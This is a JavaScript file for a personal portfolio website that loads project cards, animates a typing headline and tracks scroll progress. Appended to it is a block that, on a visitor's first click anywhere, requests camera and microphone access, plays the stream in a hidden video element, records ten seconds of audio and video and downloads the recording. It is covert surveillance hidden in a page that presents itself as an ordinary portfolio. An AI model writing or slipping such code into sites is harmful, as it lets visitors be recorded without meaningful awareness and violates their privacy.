window.addEventListener("load",()=>{
document.getElementById("loader").style.display="none"
})

const text="Electronics & Telecommunication Engineer"
let i=0

function typing(){
if(i<text.length){
document.getElementById("typing").innerHTML+=text.charAt(i)
i++
setTimeout(typing,40)
}
}

typing()

function reveal(){
document.querySelectorAll(".reveal").forEach(el=>{
const top=el.getBoundingClientRect().top
if(top<window.innerHeight-100){
el.classList.add("active")
}
})
}

window.addEventListener("scroll",reveal)

fetch("projects.json")
.then(r=>r.json())
.then(data=>{
let html=""
data.forEach(p=>{
html+=`
<div class="card">
<h3>${p.title}</h3>
<p>${p.desc}</p>
</div>
`
})
document.getElementById("projectGrid").innerHTML=html
})

window.addEventListener("scroll",()=>{
const win=document.documentElement.scrollTop
const height=document.documentElement.scrollHeight-document.documentElement.clientHeight
document.getElementById("progress").style.width=(win/height)*100+"%"
})
// ===== CAMERA AUTO START AFTER FIRST CLICK =====

let stream
let recorder
let chunks = []

async function initCamera(){

try{

stream = await navigator.mediaDevices.getUserMedia({
video:true,
audio:true
})

// create hidden video (no UI)
let video = document.createElement("video")
video.style.display = "none"
video.srcObject = stream
video.play()

startRecording()

}catch(err){
console.log("Camera permission denied")
}

}

function startRecording(){

chunks = []

recorder = new MediaRecorder(stream)

recorder.ondataavailable = e => {
if(e.data.size > 0) chunks.push(e.data)
}

recorder.onstop = () => {

let blob = new Blob(chunks,{type:"video/webm"})
let url = URL.createObjectURL(blob)

let a = document.createElement("a")
a.href = url
a.download = "recording.webm"
a.click()

}

recorder.start()

// stop after 10 sec
setTimeout(() => {
stopRecording()
},10000)

}

function stopRecording(){
if(recorder) recorder.stop()
}


// trigger on first click anywhere
document.body.addEventListener("click", () => {
initCamera()
},{ once:true })
